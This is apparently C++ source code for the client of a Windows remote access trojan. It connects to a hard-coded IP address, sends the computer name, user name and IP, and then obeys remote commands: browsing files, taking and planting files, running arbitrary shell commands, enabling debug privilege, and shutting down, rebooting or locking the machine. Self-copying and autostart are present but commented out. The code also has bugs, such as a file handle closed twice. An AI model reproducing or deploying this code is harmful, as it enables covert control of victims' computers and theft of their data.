#include "../tcpSocket/tcpSocke.h"

int GetPCMessage(SOCKET fd);//获取计算机基本信息

int recvFile(SOCKET fd, char* buf);//文件下载

int sendFile(SOCKET fd, char* buf);//文件上传

bool UpPrivilegeValue();//提权操作

int shell(SOCKET fd, const char* cmd, char* result);//执行shell指令

void process(SOCKET fd);

int main()
{
	//if (true == UpPrivilegeValue())
	//{
	//	//cout << "successs" << endl;
	//}

	//char pathName[MAX_PATH];//文件名字最大260个字符  MAX_PATH  260

	//copySelf(pathName);//将文件复制到系统目录

	//ComputerStart(pathName);//设置程序开机自启

	init_Socket();//创建客户端socket

	SOCKET fd = CreatClientScoket("192.168.0.107");//连接

	char str[BUFSIZ] = "Connect success";//连接成功
	encode(str);
	send(fd, str, BUFSIZ, 0);
	Sleep(200);

	GetPCMessage(fd);//将PC信息发送给服务端

	thread th = thread(process, fd);
	th.detach();

	HeartBeat(fd);//心跳功能


	closesocket(fd);//关闭客户端socket

	close_Socket();//WSACleanup
}

int GetPCMessage(SOCKET fd)
{
	PC_Message msg = { {0}, {0}, {0} };//定义msg结构体
	char UserName[BUFSIZ] = { 0 };//定义和初始化

	if (getmessage(&msg) == false)//获取目标计算机的IP，计算机名以及用户名
	{
		//err("getmessage");
	}

	TcharToChar(msg.UserName, UserName);//将TCHAR转换为char
	encode(msg.PCName);//加密
	//cout << msg.PCName << endl;
	encode(UserName);
	//cout << UserName << endl;
	encode(msg.IP);
	//cout << msg.IP << endl;

	send(fd, msg.PCName, BUFSIZ, 0);

	send(fd, UserName, BUFSIZ, 0);

	send(fd, msg.IP, BUFSIZ, 0);

	return 0;
}

int sendFile(SOCKET fd, char* buf)
{
	ZeroMemory(buf, sizeof(buf));
	recv(fd, buf, BUFSIZ, 0);//接收要下载的文件名（绝对路径）
	char sendbuf[BUFSIZ * 2];

	DWORD dwRead;
	BOOL bRet;
	Sleep(200);

	HANDLE hFile = CreateFile((LPCWSTR)buf, GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return 1;
	}
	while (true)
	{   //发送文件的buf
		bRet = ReadFile(hFile, sendbuf, 1024, &dwRead, NULL);
		if (bRet == FALSE)
		{
			break;
		}
		else if (dwRead == 0)
		{
			Sleep(100);
			break;
		}
		else
		{
			encode(sendbuf);
			send(fd, sendbuf, BUFSIZ * 2, 0);
		}
	}
	//char res[BUFSIZ] = "success";
	//encode(res);
	//send(fd, res, BUFSIZ, 0);
	return 0;
}

int recvFile(SOCKET fd, char* buf)//文件下载
{
	ZeroMemory(buf, sizeof(buf));
	recv(fd, buf, BUFSIZ, 0);//接受要上传文件的绝对路径
	int len;
	char recvBuf[1024] = { 0 };   // 缓冲区
	HANDLE hFile;               // 文件句柄
	DWORD count;                // 写入的数据计数

	hFile = CreateFile((LPCWSTR)(CString)buf, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_ARCHIVE, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return 1;
	}

	while (true)
	{
		// 从客户端读数据
		ZeroMemory(recvBuf, sizeof(recvBuf));
		len = recv(fd, recvBuf, 1024, 0);
		decode(recvBuf);
		if (strlen(recvBuf) < 5)
		{
			if (strcmp(recvBuf, "EOF") == 0) {
				CloseHandle(hFile);
				break;
			}
		}
		WriteFile(hFile, recvBuf, len, &count, 0);
	}
	Sleep(500);

	return 0;
}

int shell(SOCKET fd, const char* cmd, char* result)
{
	int iRet = -1;
	char buf_ps[BUFSIZ * 2];
	char ps[BUFSIZ * 2] = { 0 };
	FILE* ptr;

	strcpy(ps, cmd);

	if ((ptr = _popen(ps, "r")) != NULL)
	{
		while (fgets(buf_ps, sizeof(buf_ps), ptr) != NULL)
		{
			strcat(result, buf_ps);
			if (strlen(result) > BUFSIZ * 10)
			{
				break;
			}
		}
		_pclose(ptr);
		ptr = NULL;
		iRet = 0;  // 处理成功
	}
	//cout << result;
	send(fd, result, BUFSIZ * 10, 0);
	return iRet;
}

bool UpPrivilegeValue()
{
	HANDLE token_handle;
	//打开访问令牌
	if (!OpenProcessToken(GetCurrentProcess(),       //要修改权限的进程句柄
		TOKEN_ALL_ACCESS,          //要对令牌进行何种操作
		&token_handle              //访问令牌
	))
	{
		//printf("openProcessToken error");
	}

	LUID luid;
	if (!LookupPrivilegeValue(NULL,                 //查看的系统，本地为NULL
		SE_DEBUG_NAME,        //要查看的特权名称
		&luid                 //用来接收标识符
	))
	{
		//printf("lookupPrivilegevalue error");
	}
	TOKEN_PRIVILEGES tkp;
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = luid;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	//调整访问令牌权限
	if (!AdjustTokenPrivileges(token_handle,    //令牌句柄
		FALSE,           //是否禁用权限
		&tkp,            //新的特权的权限信息
		sizeof(tkp),     //特权信息大小
		NULL,            //用来接收特权信息当前状态的buffer
		NULL             //缓冲区大小
	))
	{
		//printf("adjust error");
	}
	//printf("sucessful");
	return true;
}

void process(SOCKET fd)
{
	char command[50] = { 0 };//存储接收的指令
	char recvbuf[BUFSIZ] = { 0 };//接收信息的缓冲区
	//创建对应的线程，需要使用时就加入

	while (true)
	{
		if (recv(fd, command, 50, 0) > 0)
		{
			decode(command);

			if (!strcmp(command, "filebrowse"))
			{
				char path[50] = { 0 };
				char* res = (char*)malloc(sizeof(char) * BUFSIZ);
				recv(fd, path, 50, 0);//接收路径
				decode(path);

				GetFileName(fd, path, res);
				//send(fd, res, BUFSIZ, 0);
				free(res);
				continue;
			}
			else if (!strcmp(command, "shell"))
			{
				char res[BUFSIZ * 10] = { 0 };
				if (recv(fd, recvbuf, BUFSIZ, 0) > 0)//获得shell指令
				{
					decode(recvbuf);
					shell(fd, recvbuf, res);
					continue;
				}
			}
			else if (!strcmp(command, "download"))
			{
				recv(fd, recvbuf, BUFSIZ, 0);
				FILE* fp = fopen(recvbuf, "r");
				if (fp == NULL)
				{
					printf("打开 %s 文件失败!\n", recvbuf);
				}
				else
				{
					char buffer[BUFSIZ];
					printf("成功打开 %s 文件!\n", recvbuf);
					ZeroMemory(buffer, BUFSIZ);
					int file_block_length = 0;
					//循环将文件file_name(fp)中的内容读取到buffer中
					while ((file_block_length = fread(buffer, sizeof(char), BUFSIZ, fp)) > 0)
					{

						// 发送buffer中的字符串到客户端  
						if (send(fd, buffer, file_block_length, 0) < 0)
						{
							printf("文件 %s 发送失败!\n", recvbuf);
							break;
						}
						//清空buffer缓存区
						ZeroMemory(buffer, sizeof(buffer));
					}
					fclose(fp);  			//关闭文件描述符fp
					printf("文件 %s 传输成功!\n", recvbuf);
				}
				fclose(fp);
			}
			else if (!strcmp(command, "upload"))
			{

				FILE* fp = fopen("D:\\vsfiles\\test\\x64\\Release\\file.txt", "w");
				if (fp == NULL)
				{
					printf("文件打开失败");
					continue;
				}
				int ret = recv(fd, recvbuf, BUFSIZ, 0);

				int write_length = fwrite(recvbuf, sizeof(char), ret, fp);
				if (write_length < ret)
				{
					printf("文件写入失败!\n");
					continue;
				}
				ZeroMemory(recvbuf, sizeof(recvbuf));   //清空接收缓存区
				ZeroMemory(recvbuf, sizeof(recvbuf));   //清空接收缓存区
				fclose(fp);
				continue;
			}
			else if (!strcmp(command, "upright"))
			{
				thread th5 = thread(UpPrivilegeValue);
				th5.join();
				continue;
			}
			else if (!strcmp(command, "kill"))
			{
				char text[60] = "Client has exit!";
				encode(text);
				send(fd, text, 60, 0);//关闭客户端
				exit(0);
				continue;
			}
			else if (!strcmp(command, "shutdown"))
			{
				char text[60] = "shutdown after 10s";
				encode(text);
				send(fd, text, 60, 0);
				system("shutdown -s -t 10");//关机
				continue;
			}
			else if (!strcmp(command, "reboot"))
			{
				char text[60] = "reboot after 10s";
				encode(text);
				send(fd, text, 60, 0);
				system("shutdown -r -t 10"); //重启
				continue;
			}
			else if (!strcmp(command, "cancel"))
			{
				system("shutdown -a");//取消关机
				char text[60] = "Cancel success";
				encode(text);
				send(fd, text, 60, 0);
				continue;
			}
			else if (!strcmp(command, "lock"))
			{
				char text[60] = "lock successs";
				encode(text);
				send(fd, text, 60, 0);
				system("%windir%\\system32\\rundll32.exe user32.dll,LockWorkStation");//锁屏
				continue;
			}
			else
			{
				//char text[60] = "Error code";
				//encode(text);
				//send(fd, text, 60, 0);//发送指令错误
				continue;
			}
			ZeroMemory(recvbuf, sizeof(recvbuf));//初始化
			ZeroMemory(command, sizeof(command));//初始化
		}
		Sleep(2000);
	}
}